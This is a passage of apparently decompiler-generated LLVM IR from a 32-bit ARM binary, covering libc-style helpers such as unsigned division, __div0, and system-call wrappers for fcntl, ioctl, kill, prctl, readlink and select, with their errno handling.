  ret i32 %v0_11f88

dec_label_pc_11f90:                               ; preds = %dec_label_pc_11efc
  %v9_11efc = icmp eq i32 %v0_11efc, %v1_11efc
  %. = zext i1 %v9_11efc to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_11f9c:                               ; preds = %dec_label_pc_11f04
  %v2_11f9c = icmp ugt i32 %v1_11efc, 65535
  br i1 %v2_11f9c, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_11f9c
  %v2_11fa0 = and i32 %v1_11efc, 32768
  %v3_11fa0 = icmp eq i32 %v2_11fa0, 0
  %v4_11fa0 = udiv i32 %v1_11efc, 65536
  br i1 %v3_11fa0, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_11f9c
  %v0_11fac65 = phi i32 [ %v1_11efc, %dec_label_pc_11f9c ], [ %v4_11fa0, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_11fb0 = phi i32 [ %v0_11fac65, %.thread16 ], [ %v4_11fa0, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_11fac = icmp ugt i32 %v1_11fb0, 255
  br i1 %v2_11fac, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_11fb0 = and i32 %v1_11fb0, 128
  %v3_11fb0 = icmp eq i32 %v2_11fb0, 0
  %v4_11fb0 = udiv i32 %v1_11fb0, 256
  br i1 %v3_11fb0, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_11fb4 = or i32 %storemerge, 8
  store i32 %v2_11fb4, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_11fc0 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_11fb4, %bb98 ]
  %v1_11fbc = phi i32 [ %v1_11fb0, %bb96 ], [ %v4_11fb0, %bb97 ], [ %v4_11fb0, %bb98 ]
  %v2_11fb8 = icmp ugt i32 %v1_11fbc, 15
  br i1 %v2_11fb8, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_11fbc = and i32 %v1_11fbc, 8
  %v3_11fbc = icmp eq i32 %v2_11fbc, 0
  %v4_11fbc = udiv i32 %v1_11fbc, 16
  br i1 %v3_11fbc, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_11fc0 = add nsw i32 %v1_11fc0, 4
  store i32 %v2_11fc0, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_11fc8 = phi i32 [ %v1_11fc0, %.thread17 ], [ %v1_11fc0, %bb99 ], [ %v2_11fc0, %bb100 ]
  %v5_11fcc = phi i32 [ %v1_11fbc, %.thread17 ], [ %v4_11fbc, %bb99 ], [ %v4_11fbc, %bb100 ]
  %v2_11fc4 = icmp ugt i32 %v5_11fcc, 3
  %v7_11fc4 = icmp eq i32 %v5_11fcc, 4
  %v2_11fc8 = xor i1 %v7_11fc4, true
  %v3_11fc8 = and i1 %v2_11fc4, %v2_11fc8
  br i1 %v3_11fc8, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_11fc8 = add nsw i32 %v4_11fc8, 3
  store i32 %v5_11fc8, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_11fcc = phi i32 [ %v4_11fc8, %.thread18 ], [ %v5_11fc8, %bb101 ]
  %v2_11fcc = xor i1 %v2_11fc4, true
  %v3_11fcc = or i1 %v7_11fc4, %v2_11fcc
  br i1 %v3_11fcc, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_11fcc = udiv i32 %v5_11fcc, 2
  %v9_11fcc = add i32 %v4_11fcc, %v8_11fcc
  store i32 %v9_11fcc, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_11fd0 = phi i32 [ %v4_11fcc, %bb102 ], [ %v9_11fcc, %bb103 ]
  %v6_11fd0 = lshr i32 %v0_11efc, %v1_11fd0
  store i32 %v6_11fd0, i32* %r0.global-to-local, align 4
  ret i32 %v6_11fd0

dec_label_pc_11fd8:                               ; preds = %entry
  %v0_11fdc = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_11fcc, { 1, 0 }
  uselistorder i1 %v7_11fc4, { 1, 0 }
  uselistorder i32 %v4_11fbc, { 1, 0 }
  uselistorder i32 %v1_11fbc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_11fb4, { 1, 0 }
  uselistorder i32 %v4_11fb0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11fb0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11fa0, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_11f78, { 1, 0 }
  uselistorder i32 %v0_11f88, { 1, 0, 2 }
  uselistorder i32 %v4_11f6c, { 1, 0 }
  uselistorder i32 %v1_11f74, { 1, 2, 0 }
  uselistorder i32 %v4_11f60, { 1, 0 }
  uselistorder i32 %v1_11f68, { 1, 2, 0 }
  uselistorder i32 %v4_11f54, { 1, 0 }
  uselistorder i32 %v1_11f5c, { 1, 2, 0 }
  uselistorder i32 %v1_11f80, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_11f50, { 1, 0 }
  uselistorder i32 %v1_11f7c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_11f3c, { 1, 0 }
  uselistorder i32 %v3_11f38, { 1, 0 }
  uselistorder i32 %v1_11f38, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_11f3c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_11f28, { 1, 0 }
  uselistorder i32 %v4_11f24, { 2, 1, 0 }
  uselistorder i32 %v1_11f28, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_11f30.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_11efc, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_11efc, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_11ef0, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 65535, { 104, 0, 1, 9, 52, 2, 28, 53, 27, 54, 25, 55, 26, 56, 57, 10, 58, 3, 59, 60, 32, 61, 31, 62, 29, 63, 30, 64, 12, 11, 65, 66, 33, 67, 34, 68, 14, 13, 69, 70, 35, 71, 36, 72, 15, 16, 4, 5, 23, 22, 38, 73, 37, 74, 17, 18, 6, 39, 75, 40, 76, 77, 78, 19, 79, 80, 7, 41, 81, 42, 82, 43, 83, 84, 85, 20, 86, 87, 8, 46, 88, 44, 89, 45, 90, 91, 21, 92, 24, 47, 93, 48, 94, 49, 95, 96, 97, 50, 98, 99, 100, 101, 51, 102, 103 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_11f88, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_11f44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f30thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_11ff0 = udiv i32 %arg1, %arg2
  ret i32 %v2_11ff0
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_1200c = call i32 @__GI_raise(i32 8)
  ret i32 %v1_1200c
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_12028 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_12028, 2
  br i1 %tmp, label %dec_label_pc_12064, label %dec_label_pc_12040

dec_label_pc_12040:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_12098, label %dec_label_pc_12054

dec_label_pc_12054:                               ; preds = %dec_label_pc_12040
  %v0_12058 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_1208c

dec_label_pc_12064:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_12080, label %dec_label_pc_12098

dec_label_pc_12080:                               ; preds = %dec_label_pc_12064
  %v0_12084 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_1208c

dec_label_pc_1208c:                               ; preds = %dec_label_pc_12054, %dec_label_pc_12080
  %storemerge2 = phi i32 [ %v0_12058, %dec_label_pc_12054 ], [ %v0_12084, %dec_label_pc_12080 ]
  %storemerge.in = load i16, i16* @global_var_23068.363, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_1208c = load i32, i32* %r2.global-to-local, align 4
  %v1_1208c = sub i32 0, %v0_1208c
  store i32 %v1_1208c, i32* %r2.global-to-local, align 4
  %v3_12090 = add i32 %storemerge, %storemerge2
  %v4_12090 = inttoptr i32 %v3_12090 to i32*
  store i32 %v1_1208c, i32* %v4_12090, align 4
  br label %dec_label_pc_12098

dec_label_pc_12098:                               ; preds = %dec_label_pc_12040, %dec_label_pc_12064, %dec_label_pc_1208c
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1208c ], [ %arg1, %dec_label_pc_12064 ], [ %arg1, %dec_label_pc_12040 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_12098, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1208c, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_120b0 = load i32, i32* @r2, align 4
  %v9_120b0 = load i32, i32* @r3, align 4
  store i32 %v9_120b0, i32* %stack_var_-4, align 4
  %v3_120b4 = load i32, i32* @r4, align 4
  store i32 %v3_120b4, i32* %stack_var_-32, align 4
  %v6_120b4 = load i32, i32* @r5, align 4
  %v12_120b4 = load i32, i32* @r7, align 4
  %v4_120c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 12772) to i32*), align 4
  %v2_120cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_120cc, i32* @r3, align 4
  %v2_120d0 = icmp eq i32 %v4_120c4, 0
  %v0_120d8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_120d8, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_120b0, i32* @r4, align 4
  br i1 %v2_120d0, label %dec_label_pc_120f4, label %dec_label_pc_120e8

dec_label_pc_120e8:                               ; preds = %entry
  %v7_120e8 = icmp eq i32 %arg2, 7
  br i1 %v7_120e8, label %dec_label_pc_12134, label %bb

bb:                                               ; preds = %dec_label_pc_120e8
  %v8_120ec = icmp eq i32 %arg2, 14
  br i1 %v8_120ec, label %dec_label_pc_12134, label %dec_label_pc_120f4

dec_label_pc_120f4:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_120d8, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_120d8, -4095
  br i1 %tmp, label %dec_label_pc_1212c, label %dec_label_pc_12114

dec_label_pc_12114:                               ; preds = %dec_label_pc_120f4
  %v0_12118 = call i32 @__aeabi_read_tp()
  %v3_1211c = load i16, i16* @global_var_23068.363, align 2
  %v4_1211c = sext i16 %v3_1211c to i32
  store i32 %v4_1211c, i32* @r3, align 4
  %v0_12120 = load i32, i32* @r2, align 4
  %v1_12120 = sub i32 0, %v0_12120
  store i32 %v1_12120, i32* @r2, align 4
  %v3_12124 = add i32 %v4_1211c, %v0_12118
  %v4_12124 = inttoptr i32 %v3_12124 to i32*
  store i32 %v1_12120, i32* %v4_12124, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1212c

dec_label_pc_1212c:                               ; preds = %dec_label_pc_120f4, %dec_label_pc_12114
  %v0_1212c = phi i32 [ %v0_120d8, %dec_label_pc_120f4 ], [ -1, %dec_label_pc_12114 ]
  br label %dec_label_pc_12180

dec_label_pc_12134:                               ; preds = %dec_label_pc_120e8, %bb
  %v0_12134 = call i32 @__libc_enable_asynccancel()
  %v0_12138 = load i32, i32* @r7, align 4
  store i32 %v0_12138, i32* @r1, align 4
  store i32 %v0_12134, i32* %r6.global-to-local, align 4
  %v0_12144 = load i32, i32* @r5, align 4
  store i32 %v0_12144, i32* %r0.global-to-local, align 4
  store i32 %v0_12144, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_12144, -4095
  br i1 %tmp15, label %dec_label_pc_12174, label %dec_label_pc_1215c

dec_label_pc_1215c:                               ; preds = %dec_label_pc_12134
  %v1_12160 = sub i32 0, %v0_12144
  %v0_12164 = call i32 @__aeabi_read_tp()
  store i32 %v0_12164, i32* %r0.global-to-local, align 4
  %v3_12168 = load i16, i16* @global_var_23068.363, align 2
  %v4_12168 = sext i16 %v3_12168 to i32
  store i32 %v4_12168, i32* @r3, align 4
  %v3_1216c = add i32 %v4_12168, %v0_12164
  %v4_1216c = inttoptr i32 %v3_1216c to i32*
  store i32 %v1_12160, i32* %v4_1216c, align 4
  store i32 -1, i32* @r2, align 4
  %v0_12174.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12174

dec_label_pc_12174:                               ; preds = %dec_label_pc_12134, %dec_label_pc_1215c
  %v0_12178 = phi i32 [ %v0_12144, %dec_label_pc_12134 ], [ -1, %dec_label_pc_1215c ]
  %v0_12174 = phi i32 [ %v0_12134, %dec_label_pc_12134 ], [ %v0_12174.pre, %dec_label_pc_1215c ]
  store i32 %v0_12174, i32* %r0.global-to-local, align 4
  store i32 %v0_12178, i32* @r7, align 4
  %v1_1217c = call i32 @__libc_disable_asynccancel(i32 %v0_12174)
  store i32 %v1_1217c, i32* %r0.global-to-local, align 4
  %v0_12180.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12180

dec_label_pc_12180:                               ; preds = %dec_label_pc_1212c, %dec_label_pc_12174
  %v0_12180 = phi i32 [ %v0_1212c, %dec_label_pc_1212c ], [ %v0_12180.pre, %dec_label_pc_12174 ]
  store i32 %v0_12180, i32* %r0.global-to-local, align 4
  %v2_12188 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12188, i32* @r4, align 4
  store i32 %v6_120b4, i32* @r5, align 4
  store i32 %v12_120b4, i32* @r7, align 4
  ret i32 %v0_12180

; uselistorder directives
  uselistorder i32 %v0_12180, { 1, 0 }
  uselistorder i32 %v0_12174, { 1, 0 }
  uselistorder i32 %v0_12144, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_120d8, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_12180, { 1, 0 }
  uselistorder label %dec_label_pc_12174, { 1, 0 }
  uselistorder label %dec_label_pc_12134, { 1, 0 }
  uselistorder label %dec_label_pc_1212c, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_121b4 = load i32, i32* @r0, align 4
  ret i32 %v1_121b4
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_121b8 = load i32, i32* @r3, align 4
  store i32 %v9_121b8, i32* %stack_var_-4, align 4
  %v3_121bc = load i32, i32* @r4, align 4
  store i32 %v3_121bc, i32* %stack_var_-32, align 4
  %v6_121bc = load i32, i32* @r5, align 4
  %v12_121bc = load i32, i32* @r7, align 4
  %v4_121cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 12772) to i32*), align 4
  %v2_121d4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_121d4, i32* @r3, align 4
  %v2_121d8 = icmp eq i32 %v4_121cc, 0
  %v0_121e0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_121e0, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_121d8, label %dec_label_pc_121f0, label %dec_label_pc_12228

dec_label_pc_121f0:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_121e0, -4095
  br i1 %tmp, label %dec_label_pc_12220, label %dec_label_pc_12208

dec_label_pc_12208:                               ; preds = %dec_label_pc_121f0
  %v1_1220c = sub i32 0, %v0_121e0
  %v3_12210 = load i16, i16* @global_var_23068.363, align 2
  %v4_12210 = sext i16 %v3_12210 to i32
  store i32 %v4_12210, i32* @r3, align 4
  %v0_12214 = call i32 @__aeabi_read_tp()
  %v2_12218 = load i32, i32* @r3, align 4
  %v3_12218 = add i32 %v2_12218, %v0_12214
  %v4_12218 = inttoptr i32 %v3_12218 to i32*
  store i32 %v1_1220c, i32* %v4_12218, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12220

dec_label_pc_12220:                               ; preds = %dec_label_pc_121f0, %dec_label_pc_12208
  %v0_12220 = phi i32 [ %v0_121e0, %dec_label_pc_121f0 ], [ -1, %dec_label_pc_12208 ]
  br label %dec_label_pc_12274

dec_label_pc_12228:                               ; preds = %entry
  %v0_12228 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12228, i32* %r6.global-to-local, align 4
  %v0_12238 = load i32, i32* @r4, align 4
  store i32 %v0_12238, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_12238, -4095
  br i1 %tmp15, label %dec_label_pc_12268, label %dec_label_pc_12250

dec_label_pc_12250:                               ; preds = %dec_label_pc_12228
  %v1_12254 = sub i32 0, %v0_12238
  %v3_12258 = load i16, i16* @global_var_23068.363, align 2
  %v4_12258 = sext i16 %v3_12258 to i32
  store i32 %v4_12258, i32* @r3, align 4
  %v0_1225c = call i32 @__aeabi_read_tp()
  store i32 %v0_1225c, i32* %r0.global-to-local, align 4
  %v2_12260 = load i32, i32* @r3, align 4
  %v3_12260 = add i32 %v2_12260, %v0_1225c
  %v4_12260 = inttoptr i32 %v3_12260 to i32*
  store i32 %v1_12254, i32* %v4_12260, align 4
  %v0_12268.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12268

dec_label_pc_12268:                               ; preds = %dec_label_pc_12228, %dec_label_pc_12250
  %v0_1226c = phi i32 [ %v0_12238, %dec_label_pc_12228 ], [ -1, %dec_label_pc_12250 ]
  %v0_12268 = phi i32 [ %v0_12228, %dec_label_pc_12228 ], [ %v0_12268.pre, %dec_label_pc_12250 ]
  store i32 %v0_12268, i32* %r0.global-to-local, align 4
  store i32 %v0_1226c, i32* @r7, align 4
  %v1_12270 = call i32 @__libc_disable_asynccancel(i32 %v0_12268)
  store i32 %v1_12270, i32* %r0.global-to-local, align 4
  %v0_12274.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12274

dec_label_pc_12274:                               ; preds = %dec_label_pc_12220, %dec_label_pc_12268
  %v0_12274 = phi i32 [ %v0_12220, %dec_label_pc_12220 ], [ %v0_12274.pre, %dec_label_pc_12268 ]
  store i32 %v0_12274, i32* %r0.global-to-local, align 4
  %v2_1227c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1227c, i32* @r4, align 4
  store i32 %v6_121bc, i32* @r5, align 4
  store i32 %v12_121bc, i32* @r7, align 4
  ret i32 %v0_12274

; uselistorder directives
  uselistorder i32 %v0_12274, { 1, 0 }
  uselistorder i32 %v0_12268, { 1, 0 }
  uselistorder i32 %v0_12238, { 1, 2, 0, 3 }
  uselistorder i32 %v0_121e0, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_12274, { 1, 0 }
  uselistorder label %dec_label_pc_12268, { 1, 0 }
  uselistorder label %dec_label_pc_12220, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12298 = load i32, i32* @r7, align 4
  store i32 %v3_12298, i32* %stack_var_-8, align 4
  %v0_122a4 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_122a4, -4095
  br i1 %tmp, label %dec_label_pc_122c4, label %dec_label_pc_122ac

dec_label_pc_122ac:                               ; preds = %entry
  %v1_122b0 = sub i32 0, %v0_122a4
  %v3_122b4 = load i16, i16* @global_var_23068.363, align 2
  %v4_122b4 = sext i16 %v3_122b4 to i32
  %v0_122b8 = call i32 @__aeabi_read_tp()
  %v3_122bc = add i32 %v4_122b4, %v0_122b8
  %v4_122bc = inttoptr i32 %v3_122bc to i32*
  store i32 %v1_122b0, i32* %v4_122bc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_122c4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_122c4

dec_label_pc_122c4:                               ; preds = %entry, %dec_label_pc_122ac
  %v1_122c8 = phi i32 [ %v0_122a4, %entry ], [ -1, %dec_label_pc_122ac ]
  %v2_122c4 = phi i32 [ %v3_12298, %entry ], [ %v2_122c4.pre, %dec_label_pc_122ac ]
  store i32 %v2_122c4, i32* @r7, align 4
  ret i32 %v1_122c8

; uselistorder directives
  uselistorder i32 %v0_122a4, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_122c4, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_122d0 = load i32, i32* @r4, align 4
  store i32 %v3_122d0, i32* %stack_var_-12, align 4
  %v0_122e0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_122e0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_122e0, -4095
  br i1 %tmp, label %dec_label_pc_12308, label %dec_label_pc_122f0

dec_label_pc_122f0:                               ; preds = %entry
  %v0_122f4 = call i32 @__aeabi_read_tp()
  %v3_122f8 = load i16, i16* @global_var_23068.363, align 2
  %v4_122f8 = sext i16 %v3_122f8 to i32
  %v0_122fc = load i32, i32* %r2.global-to-local, align 4
  %v1_122fc = sub i32 0, %v0_122fc
  store i32 %v1_122fc, i32* %r2.global-to-local, align 4
  %v3_12300 = add i32 %v4_122f8, %v0_122f4
  %v4_12300 = inttoptr i32 %v3_12300 to i32*
  store i32 %v1_122fc, i32* %v4_12300, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12308.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12308

dec_label_pc_12308:                               ; preds = %entry, %dec_label_pc_122f0
  %v1_1230c = phi i32 [ %v0_122e0, %entry ], [ -1, %dec_label_pc_122f0 ]
  %v2_12308 = phi i32 [ %v3_122d0, %entry ], [ %v2_12308.pre, %dec_label_pc_122f0 ]
  store i32 %v2_12308, i32* @r4, align 4
  ret i32 %v1_1230c

; uselistorder directives
  uselistorder i32 %v0_122e0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12308, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12314 = load i32, i32* @r7, align 4
  store i32 %v3_12314, i32* %stack_var_-8, align 4
  %v0_12320 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12320, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_12320, -4095
  br i1 %tmp, label %dec_label_pc_12348, label %dec_label_pc_12330

dec_label_pc_12330:                               ; preds = %entry
  %v0_12334 = call i32 @__aeabi_read_tp()
  %v3_12338 = load i16, i16* @global_var_23068.363, align 2
  %v4_12338 = sext i16 %v3_12338 to i32
  store i32 %v4_12338, i32* @r3, align 4
  %v0_1233c = load i32, i32* @r2, align 4
  %v1_1233c = sub i32 0, %v0_1233c
  store i32 %v1_1233c, i32* @r2, align 4
  %v3_12340 = add i32 %v4_12338, %v0_12334
  %v4_12340 = inttoptr i32 %v3_12340 to i32*
  store i32 %v1_1233c, i32* %v4_12340, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12348.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12348

dec_label_pc_12348:                               ; preds = %entry, %dec_label_pc_12330
  %v1_1234c = phi i32 [ %v0_12320, %entry ], [ -1, %dec_label_pc_12330 ]
  %v2_12348 = phi i32 [ %v3_12314, %entry ], [ %v2_12348.pre, %dec_label_pc_12330 ]
  store i32 %v2_12348, i32* @r7, align 4
  ret i32 %v1_1234c

; uselistorder directives
  uselistorder i32 %v0_12320, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12348, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12354 = load i32, i32* @r4, align 4
  store i32 %v3_12354, i32* %stack_var_-12, align 4
  %v0_12364 = load i32, i32* @r0, align 4
  store i32 %v0_12364, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12364, -4095
  br i1 %tmp, label %dec_label_pc_1238c, label %dec_label_pc_12374

dec_label_pc_12374:                               ; preds = %entry
  %v0_12378 = call i32 @__aeabi_read_tp()
  %v3_1237c = load i16, i16* @global_var_23068.363, align 2
  %v4_1237c = sext i16 %v3_1237c to i32
  %v0_12380 = load i32, i32* %r2.global-to-local, align 4
  %v1_12380 = sub i32 0, %v0_12380
  store i32 %v1_12380, i32* %r2.global-to-local, align 4
  %v3_12384 = add i32 %v4_1237c, %v0_12378
  %v4_12384 = inttoptr i32 %v3_12384 to i32*
  store i32 %v1_12380, i32* %v4_12384, align 4
  %v2_1238c.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1238c

dec_label_pc_1238c:                               ; preds = %entry, %dec_label_pc_12374
  %v1_12390 = phi i32 [ %v0_12364, %entry ], [ -1, %dec_label_pc_12374 ]
  %v2_1238c = phi i32 [ %v3_12354, %entry ], [ %v2_1238c.pre, %dec_label_pc_12374 ]
  store i32 %v2_1238c, i32* @r4, align 4
  ret i32 %v1_12390

; uselistorder directives
  uselistorder i32 %v0_12364, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1238c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_12398 = load i32, i32* @r4, align 4
  store i32 %v3_12398, i32* %stack_var_-28, align 4
  %v6_12398 = load i32, i32* @r5, align 4
  %v9_12398 = load i32, i32* @r6, align 4
  %v12_12398 = load i32, i32* @r7, align 4
  %v15_12398 = load i32, i32* @r8, align 4
  %v18_12398 = load i32, i32* @sl, align 4
  %v21_12398 = load i32, i32* @lr, align 4
  %v4_123a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 12772) to i32*), align 4
  %v2_123b0 = icmp eq i32 %v4_123a8, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_123b0, label %dec_label_pc_123cc, label %entry.dec_label_pc_123d8_crit_edge

entry.dec_label_pc_123d8_crit_edge:               ; preds = %entry
  br label %dec_label_pc_123d8

dec_label_pc_123cc:                               ; preds = %entry
  store i32 %v3_12398, i32* @r4, align 4
